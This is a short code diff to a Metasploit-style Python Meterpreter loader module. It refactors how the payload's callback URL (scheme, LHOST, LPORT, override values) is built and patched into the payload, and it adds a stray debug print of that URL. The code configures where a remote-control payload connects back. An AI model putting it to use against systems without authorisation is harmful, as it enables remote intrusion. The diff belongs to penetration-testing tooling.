@@ -107,16 +107,19 @@ module Payload::Python::MeterpreterLoader
     # TODO: move this to somewhere more common so that it can be used across payload types
     unless opts[:url].to_s == ''
       uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
-      callback_url = [
-        opts[:url].to_s.split(':')[0],
-        '://',
-        (ds['OverrideRequestHost'] ? ds['OverrideRequestLHOST'] : ds['LHOST']).to_s,
-        ':',
-        (ds['OverrideRequestHost'] ? ds['OverrideRequestLPORT'] : ds['LPORT']).to_s,
-        ds['LURI'].to_s,
-        uri,
-        '/'
-      ].join('')
+
+      scheme = opts[:url].to_s.split(':')[0]
+      lhost = ds['LHOST']
+      lport = ds['LPORT']
+      if ds['OverrideRequestHost']
+        scheme = ds['OverrideScheme'] || scheme
+        lhost = ds['OverrideLHOST'] || lhost
+        lport = ds['OverrideLPORT'] || lport
+      end
+
+      callback_url = "#{scheme}://#{lhost}:#{lport}#{ds['LURI']}#{uri}/"
+
+      $stderr.puts callback_url
 
       # patch in the various payload related configuration
       met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(callback_url)}'")
